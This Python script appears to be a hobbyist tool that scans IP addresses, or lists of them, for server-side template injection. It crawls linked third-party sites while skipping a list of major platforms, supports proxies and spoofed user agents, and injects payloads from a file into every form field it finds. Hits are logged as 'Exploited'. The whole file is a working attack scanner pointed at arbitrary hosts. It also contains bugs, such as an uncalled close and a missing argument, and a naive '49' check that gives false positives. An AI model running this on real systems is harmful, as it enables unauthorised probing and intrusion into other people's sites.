#Python3.9
import requests 
from bs4 import BeautifulSoup
from lxml import html, etree
import sys, fnmatch, threading
import re, os
import mechanize
# Test for Server side template injections with simple math
## Made this and most my "eye" programs just to get better at programming and MAINLY other programs i found dont work how i want
### TODO: 
def presentation():

    print("   ###########################")
    print("   #                         #")
    print("   #  Server Side Temp Inj.  #")
    print("   #                         #")
    print("   #                ~00xZ    #")
    print("   #                         #")
    print("   ###########################")


def gethref(site, proxy):
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
    br = mechanize.Browser()
    ssti_file = open("ssti_testpram.txt", "r")
    ur = (site)
    print(" [x] ~ SCAN: " + ur + " ~ [x]")
    try:
        req = requests.get(ur, timeout=6, headers=headers, proxies=proxy)
        soup = BeautifulSoup(req.text, 'html.parser')
        for link in soup.select('input[name*=""]'):
            okay = (link["name"])
            print("Found Input: "+okay) # br and bs4 need to link
            #print(ur)
            for ssti in ssti_file.readlines():
                ssti_list = ssti.strip("\n")
                print("Testing Code: " + ssti_list)
                try:
                    br.open(ur)
                    br.select_form(nr=0)
                    br.form[okay] = ssti_list
                    zaza = br.submit().read()
            #print(zaza)
                    exploitcode = ("*49*")
                    souper = BeautifulSoup(zaza, "html.parser")
                    if souper(text=lambda t: "49" in t):
                        print("\n [!] " + ur + " ::: "+ssti_list+" ::: [!] Exploited [!] \n")
                        fo = open("ssti_vuln_output.txt", "a+")
                        fo.write(ur + "SSTI Payload: " +ssti_list+ "\n")
                        fo.close
                    else:
                        print("Error with form: " + okay + " : URL: " + ur)
                        pass 
                except:
                    pass
    except:
        print("\n  [!] No SSTI [!]: " + ur)



		
		

def title(url, proxy):
	url = (url)
	sitelists = []
	#print("[+] Deep looking: " +url)
	blacklist = ['*stackoverflow*', "*mikrotik*", "*plesk*", "*pinterest*", '*youtu*',  '*wikipedia*', "*apache*", '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
	try:
		headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
		rqt = requests.get(url, timeout=6, verify=True, headers=headers, proxies=proxy)
		soupr = BeautifulSoup(rqt.content, 'html.parser')
		
		for link in soupr.select('a[href*="http"]'):
			site = (link.get('href'))
			site = str(site)
			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
				continue
			#print("\n [!] Found Branch: " +site)
			if site not in sitelists:
				try:
					r = requests.get(site, timeout=6, verify=True, headers=headers, proxies=proxy)
					soup = BeautifulSoup(r.content, 'lxml')
					title = (soup.select_one('title').text)
					#print("  [+] Branched: " + site + " : " + title + "  [+]")
					#print("Appended branch: " + site)
					sitelists.append(site)
					#print("Appended ")
					gethref(site, proxy)
				except:
					#print("Branch already scanned: " + site)
					pass
			else:
				pass
		try:
			r = requests.get(url, timeout=6, verify=True, headers=headers, proxies=proxy)
			soup = BeautifulSoup(r.content, 'lxml')
			title = (soup.select_one('title').text)
			print("Site title: " + title)
			site = (url)
			gethref(site, proxy)
		except: pass
	except:
		print("Sending " + site)
		gethref(site)
def whatitbe(ip, proxy):
	url = ("http://" + ip + "/")
	if proxy == '':
		pass
	else:
		proxy = {"http": "http://" +proxy}
	#print(proxy)
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
	try:
		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		print(" [!] Site Timed Out- "+url+" [!] ")
		url = ("https://" +ip+ "/")
		pass
	try:
		if proxy == '':
			pass
		else:
			proxy = {"https": "http://" +proxy}
		#print(proxy)
		url = ("https://" +ip+ "/")
		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
		title(url, proxy)
	except:
		#print(" [!] Site(s) Timed Out- "+url+" [!] ")
		pass
def main():
	presentation()
	count = 0
	if str(sys.argv[1]) == "-h":
		print("Use:")
		print("    Single server scan: sqleye.py IP")
		print("    Scan with proxy: sqleye.py (IP/ -f filename) -p 1.2.3.4")
		print("    Scan ips in file use: sqleye.py -f filename")
	elif str(sys.argv[1]) == "-f":
		input_file = open(sys.argv[2])
		proxy = ('')
		try:
			if str(sys.argv[3]) == "-p":
				proxy = str(sys.argv[4])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		for i in input_file.readlines():
			ip = i.strip("\n")
			whatitbe(ip, proxy)
	elif len(sys.argv) > 1 :
		ip = str(sys.argv[1])
		proxy = ('')
		print("Server: " + ip)
		try:
			if str(sys.argv[2]) == "-p":
				proxy = str(sys.argv[3])
				print("Proxy: " + proxy)
			else:
				pass
		except:
			pass
		whatitbe(ip, proxy)
	else:
		print("Use -h for help")
		pass
main()
